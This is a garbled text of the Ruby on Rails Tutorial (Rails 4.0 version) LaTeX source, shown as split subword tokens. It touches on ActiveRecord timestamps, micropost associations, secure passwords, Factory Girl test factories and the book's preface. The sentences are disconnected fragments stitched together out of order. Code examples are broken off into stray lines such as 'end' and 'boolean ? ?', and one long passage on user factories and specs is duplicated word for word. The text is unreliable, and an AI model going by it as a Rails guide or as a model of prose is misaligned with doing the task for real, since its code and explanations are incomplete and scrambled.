▁The ▁final ▁line ▁in ▁the ▁block , ▁\ k ode { t . timestamp s }, ▁is ▁a ▁special ▁command ▁that ▁creates ▁two ▁\ emph { magic ▁columns } ▁called ▁\ k ode { created \_ at } ▁and ▁\ k ode { updated \_ at }, ▁which ▁are ▁timestamp s ▁that ▁automatically ▁record ▁when ▁a ▁given ▁user ▁is ▁created ▁and ▁updated .
▁Of ▁course , ▁ knowledg e ▁of ▁this ▁inheritance ▁does n ' t ▁do ▁any ▁good ▁unless ▁we ▁know ▁what ▁\ k ode { ActiveRecord :: Base } ▁contains , ▁so ▁let ' s ▁get ▁started ▁with ▁some ▁concrete ▁examples .
▁They ▁are ▁important , ▁though , ▁and ▁I ▁suggest ▁learning ▁about ▁them ▁using ▁one ▁of ▁the ▁Ruby ▁book s ▁recommended ▁in ▁Section ~\ ref { sec : comments _ for _ various _ reader s }.
▁=> ▁[ # < User ▁id : ▁1, ▁name : ▁" Michael ▁Hartl ", ▁email : ▁" mhartl @ example . com ",
▁Now ▁that ▁we ' ve ▁updated ▁the ▁user ▁by ▁running ▁\ k ode { user . save }, ▁the ▁magic ▁columns ▁differ , ▁as ▁ promised ▁in ▁Section ~\ ref { sec : creating _ user _ objects } :
▁The ▁second ▁main ▁way ▁to ▁update ▁attributes ▁is ▁to ▁use ▁\ k ode { update \_ attributes } :
▁If ▁we ▁only ▁need ▁to ▁update ▁a ▁single ▁attribute , ▁using ▁the ▁singular ▁\ k ode { update \_ attribute } ▁bypass es ▁this ▁restrict ion :
▁( We ' ll ▁put ▁the ▁\ k ode { created \_ at } ▁column ▁to ▁work ▁in ▁Section ~\ ref { sec : order ing _ and _ dependency } ▁and ▁Section ~\ ref { sec : a ug ment ing _ the _ user _ show _ page }. )
▁end
▁On ce ▁we ▁define ▁the ▁proper ▁associations , ▁the ▁result ing ▁\ k ode {@ micropost } ▁variable ▁will ▁automatically ▁have ▁\ k ode { user \_ id } ▁equal ▁to ▁its ▁ associated ▁user .
▁By ▁default , ▁using ▁\ k ode { user . microposts } ▁to ▁pull ▁a ▁user ' s ▁microposts ▁from ▁the ▁database ▁make s ▁no ▁guarantee s ▁about ▁the ▁order ▁of ▁the ▁posts , ▁but ▁( following ▁the ▁convention ▁of ▁blog s ▁and ▁Twitter ) ▁we ▁want ▁the ▁microposts ▁to ▁come ▁out ▁in ▁reverse ▁order ▁of ▁when ▁they ▁were ▁created , ▁i . e . , ▁most ▁ recent ▁first .
▁Now ▁the ▁tests ▁should ▁pass .
▁To ▁make ▁these ▁collection s , ▁it ' s ▁worth ▁know ing ▁about ▁the ▁useful ▁\ k ode { \ % w [ ]} ▁technique ▁for ▁making ▁arrays ▁of ▁strings , ▁as ▁seen ▁in ▁this ▁console ▁session :
▁Here ▁the ▁option ▁\ k ode { dependent : ▁: destroy } ▁in
▁arrange s ▁for ▁the ▁ dependent ▁microposts ▁( i . e . , ▁the ▁one s ▁ belonging ▁to ▁the ▁given ▁user ) ▁to ▁be ▁destroyed ▁when ▁the ▁user ▁itself ▁is ▁destroyed .
▁Noti ce ▁here ▁how ▁cl ever ▁\ k ode { paginate } ▁is --- it ▁even ▁works ▁through ▁the ▁microposts ▁association , ▁reach ing ▁into ▁the ▁\ text tt { microposts } ▁table ▁and ▁pull ing ▁out ▁the ▁desired ▁page ▁of ▁microposts .
▁Instead , ▁it ▁as k s ▁the ▁database ▁to ▁count ▁the ▁microposts ▁with ▁the ▁given ▁\ k ode { user \_ id }.
▁In ▁the ▁unlike ly ▁even t ▁that ▁find ing ▁the ▁count ▁is ▁ still ▁a ▁bot t le n ec k ▁in ▁your ▁application , ▁you ▁can ▁make ▁it ▁even ▁faster ▁with ▁a ▁\ href { http :// r ailscasts . com / episodes / 23 - counter - cache - column }{\ emph { counter ▁cache } }.
▁With ▁all ▁the ▁work ▁making ▁templates ▁for ▁user ▁microposts ▁in ▁Section ~\ ref { sec : a ug ment ing _ the _ user _ show _ page }, ▁the ▁end ing ▁was ▁rather ▁an tic li m ac tic .
▁The ▁uniqueness ▁caveat
▁To ▁avoid ▁this ▁in compatibility , ▁we ' ll ▁standard ize ▁on ▁all ▁lower - case ▁addresses , ▁convert ing ▁`` Foo @ Ex A M P le . Co M '' ▁to ▁`` foo @ example . com '' ▁before ▁saving ▁it ▁to ▁the ▁database .
▁See ▁the ▁\ href { http :// api . rubyonrails . org / v 4 . 1 . 5 / classes / ActiveRecord / Callbacks . html }{ Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁( This ▁is ▁just ▁a ▁first ▁implementation ; ▁we ' ll ▁discuss ▁this ▁subject ▁again ▁in ▁Section ~\ ref { sec : remember _ me }, ▁where ▁we ' ll ▁use ▁the ▁preferred ▁\ emph { method ▁reference } ▁convention ▁for ▁defin ing ▁callbacks .)
▁as ▁seen ▁in ▁Listing ~\ ref { code : create _ destroy _ micropost _ tests }.
▁end
▁We ' ll ▁start ▁with ▁the ▁\ k ode { create } ▁action ▁for ▁microposts , ▁which ▁is ▁similar ▁to ▁its ▁user ▁an a log ue ▁( Listing ~\ ref { code : user _ create _ action }) ; ▁the ▁principal ▁difference ▁ li es ▁in ▁using ▁the ▁user / micropost ▁association ▁to ▁\ k ode { build } ▁the ▁new ▁micropost , ▁as ▁seen ▁in ▁Listing ~\ ref { code : microposts _ create _ action }.
▁Note ▁the ▁use ▁of ▁ strong ▁parameters ▁via ▁\ k ode { micropost \_ params }, ▁which ▁ permit s ▁only ▁the ▁micropost ▁content ▁to ▁be ▁edit ed ▁through ▁the ▁web .
▁The ▁User ▁model ▁with ▁an ▁added ▁\ k ode { password \_ digest } ▁attribute .
▁We ▁can ▁choose ▁any ▁migration ▁name ▁we ▁want , ▁but ▁it ' s ▁convenient ▁to ▁end ▁the ▁name ▁with ▁\ k ode { to \_ users }, ▁since ▁in ▁this ▁case ▁Rails ▁automatically ▁construct s ▁a ▁migration ▁to ▁add ▁columns ▁to ▁the ▁\ k ode { users } ▁table .
▁else
▁( Compar e ▁this ▁to ▁the ▁original ▁generation ▁of ▁the ▁\ k ode { users } ▁table ▁in ▁Listing ~\ ref { code : generate _ user _ model }, ▁which ▁included ▁the ▁arguments ▁\ k ode { name : string } ▁and ▁\ k ode { email : string }. )
▁By ▁including ▁\ k ode { password \_ digest : string }, ▁we ' ve ▁given ▁Rails ▁enough ▁information ▁to ▁construct ▁the ▁entire ▁migration ▁for ▁us , ▁as ▁seen ▁in ▁Listing ~\ ref { code : password _ migration }.
▁This ▁is ▁the ▁home ▁page ▁for ▁the
▁sample ▁application .
▁To ▁use ▁bcrypt ▁in ▁the ▁sample ▁application , ▁we ▁need ▁to ▁add ▁the ▁\ k ode { bcrypt } ▁gem ▁to ▁our ▁\ k ode { Gemfile } ▁( Listing ~\ ref { code : bcrypt _ ruby }).
▁ Adding ▁\ k ode { bcrypt - ruby } ▁to ▁the ▁\ k ode { Gemfile }.
▁< span >
▁\ k ode { f . object } ▁is ▁\ k ode {@ micropost }.
▁To ▁pass ▁the ▁object ▁to ▁the ▁partial , ▁we ▁use ▁a ▁hash ▁with ▁value ▁equal ▁to ▁the ▁object ▁and ▁key ▁equal ▁to ▁the ▁desired ▁name ▁of ▁the ▁variable ▁in ▁the ▁partial , ▁which ▁is ▁what ▁this ▁code ▁accomplish es :
▁In ▁other ▁words , ▁\ k ode { object : ▁f . object } ▁creates ▁a ▁variable ▁called ▁\ k ode { object } ▁in ▁the ▁\ k ode { error \_ messages } ▁partial .
▁as ▁show n ▁in ▁Listing ~\ ref { code : updated _ error _ messages _ partial }.
▁We ' ll ▁also ▁take ▁a ▁more ▁concrete ▁look ▁at ▁the ▁effect s ▁of ▁adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model , ▁including ▁an ▁ ex am in ation ▁of ▁the ▁important ▁\ k ode { authenticate } ▁method .
▁See ▁the ▁Rails ▁G u id e ▁on ▁the ▁\ href { http :// guides . rubyonrails . org / active _ record _ query ing . html }{ Active ▁Record ▁ Query ▁In ter fa ce } ▁for ▁more ▁on ▁\ k ode { where } ▁and ▁the ▁like .
▁We ▁can ▁add ▁a ▁secure ▁password ▁to ▁a ▁model ▁using ▁the ▁built - in ▁\ k ode { has \_ secure \_ password } ▁method .
▁U nfortunately , ▁return ing ▁a ▁ paginate d ▁feed ▁does n ' t ▁work ▁in ▁this ▁case .
▁Implement ▁it ▁and ▁click ▁on ▁a ▁pagination ▁link ▁to ▁see ▁why .
▁in ▁Listing ~\ ref { code : micropost _ partial _ with _ delete } ▁and
▁In ▁the ▁\ k ode { correct \_ user } ▁before ▁filter , ▁note ▁that ▁we ▁find ▁microposts ▁\ emph { through } ▁the ▁association :
▁in ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission }.
▁as ▁seen ▁in ▁Listing ~\ ref { code : micropost _ user _ m is match _ test }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ create _ image _ upload }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ partial _ image _ display }.
▁in ▁Listing ~\ ref { code : micropost _ model _ image }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ model _ image _ validation }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : c ar r i er _ w a ve _ configuration }.
▁There ▁are ▁10 ▁kind s ▁of ▁people ▁in ▁the ▁world : ▁Those ▁who ▁like ▁the ▁ ternary ▁operator , ▁those ▁who ▁don ' t , ▁and ▁those ▁who ▁don ' t ▁know ▁about ▁it .
▁if ▁boolean ?
▁boolean ? ▁ ?
▁You ▁can ▁also ▁use ▁the ▁ ternary ▁operator ▁to ▁replace ▁assignment :
▁var ▁= ▁boolean ? ▁ ?
▁A nother ▁common ▁use ▁is ▁in ▁a ▁function ' s ▁return ▁value :
▁def ▁ foo
▁do _ stuff
▁boolean ? ▁ ?
▁S ince ▁Ruby ▁ implicit ly ▁returns ▁the ▁value ▁of ▁the ▁last ▁expression ▁in ▁a ▁function , ▁here ▁the ▁\ text tt { foo } ▁method ▁returns ▁\ text tt {" bar "} ▁or ▁\ text tt {" baz "} ▁depending ▁on ▁the ▁value ▁of ▁\ text tt { boolean ? }.
▁A ▁helper ▁to ▁wrap ▁long ▁words .
▁as ▁show n ▁in ▁Listing ~\ ref { code : edit _ tests _ logged _ in }.
▁in ▁Listing ~\ ref { code : edit _ update _ wrong _ user _ tests }.
▁As ▁a ▁b on us , ▁by ▁using ▁base 64 ▁strings ▁specifically ▁design ed ▁to ▁be ▁safe ▁in ▁URLs ▁( as ▁indicate d ▁by ▁the ▁name ▁\ k ode { url safe \_ base 64 }), ▁we ' ll ▁be ▁able ▁to ▁use ▁the ▁same ▁token ▁generator ▁to ▁make ▁account ▁activation ▁and ▁password ▁reset ▁links ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }.
▁It ' s ▁also ▁worth ▁noting ▁that ▁this ▁chapter ▁saw ▁the ▁last ▁of ▁the ▁necessary ▁gem ▁installation s .
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }, ▁we ' ll ▁make ▁\ emph { s ure } ▁of ▁email ▁validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁in ▁Listing ~\ ref { code : user _ pages _ spec } ▁and
▁in ▁Listing ~\ ref { code : initial _ signup _ test }.
▁A ▁re ca p ▁of ▁the ▁initial ▁User ▁pages ▁spec .
▁# ▁Re place ▁with ▁code ▁to ▁make ▁a ▁user ▁variable
▁where ▁we ▁need ▁to ▁fill ▁in ▁the ▁comment ▁with ▁the ▁appropriate ▁code .
▁It ▁the n ▁tests ▁that ▁the ▁page ▁content ▁and ▁title ▁both ▁contain ▁the ▁user ' s ▁name .
▁In ▁order ▁to ▁make ▁the ▁necessary ▁User ▁model ▁object , ▁we ▁could ▁use ▁Active ▁Record ▁to ▁create ▁a ▁user ▁with ▁\ k ode { User . create }, ▁but ▁experience ▁shows ▁that ▁user ▁\ emph { factor ies } ▁are ▁a ▁more ▁convenient ▁way ▁to ▁define ▁user ▁objects ▁and ▁insert ▁them ▁in ▁the ▁database .
▁We ' ll ▁be ▁using ▁the ▁factor ies ▁generated ▁by ▁\ href { http :// github . com / thoughtbot / factory _ g ir l }{ Factory ▁Girl }, ▁a ▁Ruby ▁gem ▁produce d ▁by ▁the ▁good ▁people ▁at ▁\ href { http :// thoughtbot . com /}{ thoughtbot }.
▁As ▁with ▁RSpec , ▁ Factory ▁Girl ▁defines ▁a ▁domain - specific ▁language ▁in ▁Ruby , ▁in ▁this ▁case ▁special ize d ▁for ▁defin ing ▁Active ▁Record ▁objects .
▁The ▁syntax ▁is ▁simple , ▁rely ing ▁on ▁Ruby ▁blocks ▁and ▁custom ▁methods ▁to ▁define ▁the ▁attributes ▁of ▁the ▁desired ▁object .
▁For ▁cases ▁such ▁as ▁the ▁one ▁in ▁this ▁chapter , ▁the ▁advantage ▁over ▁Active ▁Record ▁may ▁not ▁be ▁obvious , ▁but ▁we ' ll ▁use ▁more ▁advanced ▁features ▁of ▁factor ies ▁in ▁future ▁chapter s .
▁( S ince ▁ Factory ▁Girl ▁is ▁only ▁needed ▁in ▁the ▁tests , ▁we ' ve ▁put ▁it ▁in ▁the ▁\ k ode { : test } ▁group .)
▁ Adding ▁ Factory ▁Girl ▁to ▁the ▁\ k ode { Gemfile }.
▁in ▁Listing ~\ ref { code : user _ factory }.
▁A ▁ factory ▁to ▁simul ate ▁User ▁model ▁objects .
▁By ▁passing ▁the ▁symbol ▁\ k ode { : user } ▁to ▁the ▁\ k ode { factory } ▁command , ▁we ▁tell ▁ Factory ▁Girl ▁that ▁the ▁subsequent ▁definition ▁is ▁for ▁a ▁User ▁model ▁object .
▁in ▁Listing ~\ ref { code : user _ show _ page _ test }.
▁You ▁should ▁verify ▁at ▁this ▁point ▁that ▁the ▁test ▁suite ▁is ▁re d :
▁in ▁Listing ~\ ref { code : name _ title _ and _ head ing }.
▁ Adding ▁a ▁title ▁and ▁ head ing ▁for ▁the ▁user ▁profile ▁page .
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }, ▁we ' ll ▁make ▁\ emph { s ure } ▁of ▁email ▁validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁This ▁means ▁that ▁we ▁have ▁to ▁create ▁a ▁new ▁\ k ode { app / views / shared } ▁directory ▁using ▁\ k ode { mkdir } ▁( Table ~\ ref { table : un i x _ command _ line }) :
▁In ▁order ▁to ▁test ▁the ▁form ▁submission , ▁we ▁need ▁to ▁issue ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { users \_ path } ▁( Table ~\ ref { table : table - RESTful _ users }), ▁which ▁we ▁can ▁do ▁with ▁the ▁\ k ode { post } ▁function :
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }, ▁we ' ll ▁make ▁\ emph { s ure } ▁of ▁email ▁validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁in ▁Listing ~\ ref { code : user _ pages _ spec } ▁and
▁in ▁Listing ~\ ref { code : initial _ signup _ test }.
▁A ▁re ca p ▁of ▁the ▁initial ▁User ▁pages ▁spec .
▁# ▁Re place ▁with ▁code ▁to ▁make ▁a ▁user ▁variable
▁where ▁we ▁need ▁to ▁fill ▁in ▁the ▁comment ▁with ▁the ▁appropriate ▁code .
▁It ▁the n ▁tests ▁that ▁the ▁page ▁content ▁and ▁title ▁both ▁contain ▁the ▁user ' s ▁name .
▁In ▁order ▁to ▁make ▁the ▁necessary ▁User ▁model ▁object , ▁we ▁could ▁use ▁Active ▁Record ▁to ▁create ▁a ▁user ▁with ▁\ k ode { User . create }, ▁but ▁experience ▁shows ▁that ▁user ▁\ emph { factor ies } ▁are ▁a ▁more ▁convenient ▁way ▁to ▁define ▁user ▁objects ▁and ▁insert ▁them ▁in ▁the ▁database .
▁We ' ll ▁be ▁using ▁the ▁factor ies ▁generated ▁by ▁\ href { http :// github . com / thoughtbot / factory _ g ir l }{ Factory ▁Girl }, ▁a ▁Ruby ▁gem ▁produce d ▁by ▁the ▁good ▁people ▁at ▁\ href { http :// thoughtbot . com /}{ thoughtbot }.
▁As ▁with ▁RSpec , ▁ Factory ▁Girl ▁defines ▁a ▁domain - specific ▁language ▁in ▁Ruby , ▁in ▁this ▁case ▁special ize d ▁for ▁defin ing ▁Active ▁Record ▁objects .
▁The ▁syntax ▁is ▁simple , ▁rely ing ▁on ▁Ruby ▁blocks ▁and ▁custom ▁methods ▁to ▁define ▁the ▁attributes ▁of ▁the ▁desired ▁object .
▁For ▁cases ▁such ▁as ▁the ▁one ▁in ▁this ▁chapter , ▁the ▁advantage ▁over ▁Active ▁Record ▁may ▁not ▁be ▁obvious , ▁but ▁we ' ll ▁use ▁more ▁advanced ▁features ▁of ▁factor ies ▁in ▁future ▁chapter s .
▁( S ince ▁ Factory ▁Girl ▁is ▁only ▁needed ▁in ▁the ▁tests , ▁we ' ve ▁put ▁it ▁in ▁the ▁\ k ode { : test } ▁group .)
▁ Adding ▁ Factory ▁Girl ▁to ▁the ▁\ k ode { Gemfile }.
▁in ▁Listing ~\ ref { code : user _ factory }.
▁A ▁ factory ▁to ▁simul ate ▁User ▁model ▁objects .
▁By ▁passing ▁the ▁symbol ▁\ k ode { : user } ▁to ▁the ▁\ k ode { factory } ▁command , ▁we ▁tell ▁ Factory ▁Girl ▁that ▁the ▁subsequent ▁definition ▁is ▁for ▁a ▁User ▁model ▁object .
▁in ▁Listing ~\ ref { code : user _ show _ page _ test }.
▁You ▁should ▁verify ▁at ▁this ▁point ▁that ▁the ▁test ▁suite ▁is ▁re d :
▁in ▁Listing ~\ ref { code : name _ title _ and _ head ing }.
▁ Adding ▁a ▁title ▁and ▁ head ing ▁for ▁the ▁user ▁profile ▁page .
▁Note ▁the ▁presence ▁of ▁\ text tt { https :// } ▁and ▁a ▁ lock ▁icon ▁in ▁the ▁address ▁bar ▁of ▁F igure ~\ ref { fig : signup _ failure _ mockup }, ▁which ▁indicate ▁that ▁SSL ▁is ▁working .
▁F inally , ▁we ' ll ▁add ▁authorization ▁methods ▁to ▁our ▁actions ▁to ▁enforce ▁a ▁site ▁security ▁model .
▁By ▁the ▁way , ▁if ▁you ▁have ▁deploy ed ▁your ▁sample ▁app ▁to ▁Heroku , ▁you ▁can ▁see ▁its ▁environment ▁using ▁the ▁\ text tt { heroku } ▁command , ▁which ▁provides ▁its ▁own ▁( remote ) ▁console :
▁< n > ▁Ruby ▁console ▁for ▁your app . heroku app . com
▁Gravatar ▁is ▁a ▁free ▁ service ▁that ▁allows ▁users ▁to ▁upload ▁images ▁and ▁associate ▁them ▁with ▁email ▁addresses ▁they ▁control .
▁If ▁your ▁application ▁does ▁need ▁to ▁handle ▁custom ▁images ▁or ▁other ▁file ▁upload s , ▁I ▁recommend ▁\ href { https :// github . com / thoughtbot / paper c li p }{ P ap er c li p } ▁or ▁\ href { https :// github . com / j n ic k la s / carrierwave }{ CarrierWave }.
▁We ir d , ▁right ? ▁I ▁don ' t ▁get ▁it ▁either .
▁ Welcome ▁to ▁the ▁\ href { http :// www . railstutorial . org / ruby - on - rails - tutorial - book }{\ emph { Ruby ▁on ▁Rails ▁Tutorial } }.
▁The ▁goal ▁of ▁this ▁book ▁is ▁to ▁be ▁the ▁best ▁an s w er ▁to ▁the ▁question , ▁`` If ▁I ▁want ▁to ▁learn ▁web ▁development ▁with ▁\ href { http :// rubyonrails . org /}{ Ruby ▁on ▁Rails }, ▁where ▁should ▁I ▁start ? ''
▁By ▁the ▁time ▁you ▁finish ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }, ▁you ▁will ▁have ▁all ▁the ▁ skills ▁you ▁need ▁to ▁develop ▁and ▁deploy ▁your ▁own ▁custom ▁web ▁applications ▁with ▁Rails .
▁You ▁will ▁also ▁be ▁ready ▁to ▁benefit ▁from ▁the ▁many ▁more ▁advanced ▁book s , ▁blog s , ▁and ▁screencasts ▁that ▁are ▁part ▁of ▁the ▁thr i v ing ▁Rails ▁ ed u c ation al ▁e co system .
▁F inally , ▁since ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁uses ▁Rails ~ 4 , ▁the ▁ knowledg e ▁you ▁gain ▁here ▁represent s ▁the ▁state ▁of ▁the ▁a r t ▁in ▁web ▁development .
▁(\ emph { Note } : ▁The ▁present ▁ v ol um e ▁is ▁the ▁Rails ~4.0 ▁\ emph { version } ▁of ▁the ▁book , ▁which ▁means ▁that ▁it ▁has ▁been ▁re v is ed ▁to ▁be ▁compatib le ▁with ▁Rails ~4.0 , ▁but ▁it ▁is ▁not ▁yet ▁a ▁new ▁\ emph { edit ion } ▁because ▁the ▁changes ▁in ▁Rails ▁don ' t ▁yet ▁just ify ▁it .
▁ From ▁the ▁per spec tive ▁of ▁an ▁introduc tory ▁tutorial , ▁the ▁difference s ▁between ▁Rails ~4.0 ▁and ▁the ▁previous ▁version , ▁Rails ~3 . 2 , ▁are ▁ s l ight .
▁On ce ▁the ▁changes ▁in ▁Rails ▁just ify ▁the ▁effort , ▁I ▁plan ▁to ▁ prepare ▁a ▁full ▁new ▁edition ▁of ▁the ▁\ emph { Rails ▁Tutorial }, ▁including ▁cover age ▁of ▁topic s ▁such ▁as ▁\ emph { Turbolinks } ▁and ▁\ emph { R us s i an ▁do ll ▁caching }, ▁as ▁well ▁as ▁some ▁new ▁aspect s ▁of ▁RSpec , ▁such ▁as ▁\ emph { feature ▁spec s }. )
▁D if f s ▁from ▁the ▁2 n d ▁edition
▁This ▁is ▁a ▁( nearly ) ▁com pre h en s ive ▁list ▁of ▁difference s ▁between ▁the ▁2 n d ▁edition ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁and ▁the ▁present ▁version .
▁( The ▁only ▁really ▁important ▁one ▁is ▁the ▁change ▁to ▁ strong ▁parameters ; ▁the ▁other s ▁are ▁all ▁relative ly ▁minor .)
▁This ▁list ▁is ▁present ed ▁for ▁the ▁convenience ▁of ▁those ▁who ▁read ▁the ▁2 n d ▁edition ▁( or ▁are ▁otherwise ▁ familiar ▁with ▁Rails ~3 . 2 ) ▁and ▁want ▁a ▁summary ▁of ▁the ▁d if f s .
▁In ▁what ▁follows , ▁each ▁item ▁includes ▁a ▁reference ▁to ▁a ▁section ▁or ▁code ▁list ing ▁with ▁an ▁example ▁of ▁the ▁change ▁in ▁question .
▁It ' s ▁worth ▁emphasi z ing ▁that ▁the ▁goal ▁of ▁this ▁book ▁is ▁\ emph { not } ▁me re ly ▁to ▁teach ▁Rails , ▁but ▁rather ▁to ▁teach ▁\ emph { web ▁development ▁with ▁Rails }, ▁which ▁means ▁a c q u ir ing ▁( or ▁ expand ing ) ▁the ▁ skills ▁needed ▁to ▁develop ▁software ▁for ▁the ▁World ▁Wi de ▁Web .
▁To ▁accomplish ▁this ▁goal , ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁take s ▁an ▁integrat ed ▁approach : ▁you ▁will ▁learn ▁Rails ▁by ▁example ▁by ▁build ing ▁a ▁substan tial ▁sample ▁application ▁from ▁scratch .
▁We ' ll ▁the n ▁create ▁our ▁first ▁Rails ▁application , ▁called ▁( app r o p r i ate ly ▁enough ) ▁\ k ode { first \_ app }.
▁In ▁Chapter ~\ ref { cha : a _ demo _ app }, ▁we ' ll ▁make ▁a ▁second ▁project , ▁who se ▁purpose ▁is ▁to ▁demonstrate ▁the ▁basic ▁working s ▁of ▁a ▁Rails ▁application .
▁The ▁rest ▁of ▁the ▁tutorial ▁focus es ▁on ▁developing ▁a ▁single ▁large ▁\ emph { sample ▁application } ▁( called ▁\ k ode { sample \_ app }), ▁writing ▁all ▁the ▁code ▁from ▁scratch .
▁The ▁final ▁sample ▁application ▁will ▁be ar ▁more ▁than ▁a ▁passing ▁re s em b l ance ▁to ▁a ▁certain ▁popular ▁\ href { http :// twitter . com /}{ so cial ▁microblog g ing ▁site }--- a ▁site ▁which , ▁co in cidentally , ▁was ▁also ▁original ly ▁written ▁in ▁Rails .
▁T h ough ▁of ▁ n ec es s ity ▁our ▁effort s ▁will ▁focus ▁on ▁this ▁specific ▁sample ▁application , ▁the ▁emphasi s ▁throughout ▁the ▁\ emph { Rails ▁Tutorial } ▁will ▁be ▁on ▁general ▁principle s , ▁so ▁that ▁you ▁will ▁have ▁a ▁so li d ▁foundation ▁no ▁matter ▁what ▁kind s ▁of ▁web ▁applications ▁you ▁want ▁to ▁build .
▁But ▁be ▁ w ar n ed : ▁they ▁accomplish ▁their ▁a ma z ing ▁f if t e en - minute ▁f e at ▁using ▁a ▁feature ▁called ▁\ emph { scaffold ing }, ▁which ▁relie s ▁heav ily ▁on ▁\ emph { generated ▁code }, ▁magic ally ▁created ▁by ▁the ▁Rails ▁\ k ode { generate } ▁command .
▁S ince ▁its ▁ de but ▁in ▁200 4 , ▁Ruby ▁on ▁Rails ▁has ▁ r api d ly ▁become ▁one ▁of ▁the ▁most ▁powerful ▁and ▁popular ▁frameworks ▁for ▁build ing ▁dynamic ▁web ▁applications .
▁There ▁are ▁also ▁many ▁web ▁development ▁sho p s ▁that ▁special ize ▁in ▁Rails , ▁such ▁as ▁\ href { http :// ent p . com /}{ E N T P }, ▁\ href { http :// thoughtbot . com /}{ thoughtbot }, ▁\ href { http :// p i v o t all abs . com /}{ P i v o t al ▁L abs }, ▁and ▁\ href { http :// h ashrocket . com /}{ H ashrocket }, ▁plus ▁in numerable ▁in dependent ▁consult ant s , ▁tr a in ers , ▁and ▁con tr ac to r s .
▁The ▁\ emph { Rails ▁Tutorial } ▁contains ▁integrat ed ▁tutorial s ▁not ▁only ▁for ▁Rails , ▁but ▁also ▁for ▁the ▁under ly ing ▁Ruby ▁language , ▁the ▁RSpec ▁testing ▁framework , ▁\ href { http :// en . wiki p edia . org / wiki / HTML }{ HTML }, ▁\ href { http :// en . wiki p edia . org / wiki / CSS }{ CSS }, ▁a ▁small ▁amount ▁of ▁\ href { http :// en . wiki p edia . org / wiki / JavaScript }{ JavaScript }, ▁and ▁even ▁a ▁little ▁\ href { http :// en . wiki p edia . org / wiki / SQL }{ SQL }. ▁This ▁means ▁that , ▁no ▁matter ▁where ▁you ▁current ly ▁are ▁in ▁your ▁ knowledg e ▁of ▁web ▁development , ▁by ▁the ▁time ▁you ▁finish ▁this ▁tutorial ▁you ▁will ▁be ▁ready ▁for ▁more ▁advanced ▁Rails ▁resources , ▁as ▁well ▁as ▁for ▁the ▁more ▁system at ic ▁treat ment s ▁of ▁the ▁other ▁subject s ▁mentioned .
▁If ▁you ▁prefer ▁to ▁learn ▁everything ▁system at ical ly ▁from ▁the ▁ ground ▁up , ▁or ▁if ▁you ▁have ▁ never ▁program m ed ▁before , ▁the n ▁learning ▁Ruby ▁first ▁m ight ▁work ▁well ▁for ▁you , ▁and ▁in ▁this ▁case ▁I ▁recommend ▁\ href { http :// www . a mazon . com / g p / product /1 4 3022 36 34 }{\ emph { B eginning ▁Ruby } } ▁by ▁P e ter ▁Co o p er .
▁On ▁the ▁other ▁hand , ▁many ▁beginning ▁Rails ▁developers ▁are ▁ ex c it ed ▁about ▁making ▁\ emph { web } ▁applications , ▁and ▁would ▁rather ▁not ▁ s log ▁through ▁a ▁50 0 - page ▁book ▁on ▁pure ▁Ruby ▁before ▁ever ▁writing ▁a ▁single ▁web ▁page .
▁As ▁noted ▁in ▁the ▁introduction , ▁the ▁\ emph { Rails ▁Tutorial } ▁uses ▁test - driven ▁development ▁( also ▁called ▁test - first ▁development ), ▁which ▁in ▁my ▁view ▁is ▁the ▁best ▁way ▁to ▁develop ▁Rails ▁applications , ▁but ▁it ▁does ▁introduce ▁a ▁substan tial ▁amount ▁of ▁overhead ▁and ▁complex ity .
▁" About "
▁This ▁latter ▁strategy ▁involve s ▁creating ▁the ▁necessary ▁test ▁files ▁( called ▁\ emph { spec s }) ▁and ▁ filling ▁them ▁with ▁the ▁test ▁code ▁\ emph { exactly } ▁as ▁it ▁appears ▁in ▁the ▁book .
▁At ▁the ▁end ▁of ▁this ▁process , ▁no ▁matter ▁where ▁you ▁started , ▁you ▁should ▁be ▁ready ▁for ▁the ▁many ▁more ▁in ter m edia t e - to - advance d ▁Rails ▁resources ▁out ▁there .
▁\ href { http :// r ailscasts . com /}{ RailsCast s } ▁by ▁ Ryan ▁B ate s : ▁ Ex ce ll ent ▁( most ly ) ▁free ▁Rails ▁screencasts
▁\ href { http :// m b s y . co / 6 V Q 8 l }{ C ode ▁School } : ▁In ter active ▁programming ▁course s
▁\ href { http :// guides . rubyonrails . org /}{ Rails ▁G u id es } : ▁G ood ▁topic al ▁and ▁up - to - date ▁Rails ▁reference s
▁Windows ▁users ▁should ▁understand ▁that ▁their ▁systems ▁will ▁use ▁the ▁analogous ▁ angle ▁prompt ~\ k ode { > } :
▁C : \ Site s > ▁e ch o ▁" hello , ▁world "
▁On ▁Unix ▁systems , ▁some ▁commands ▁should ▁be ▁executed ▁with ▁\ k ode { s u do }, ▁which ▁stand s ▁for ▁`` sub st it ute ▁user ▁do ''
▁Rails ▁comes ▁with ▁lot s ▁of ▁commands ▁that ▁can ▁be ▁run ▁at ▁the ▁command ▁line .
▁My ▁Rails ▁Tutorial ▁sample ▁application , ▁for ▁instance , ▁live s ▁in
▁/ Users / mhartl / rails _ projects / sample _ app
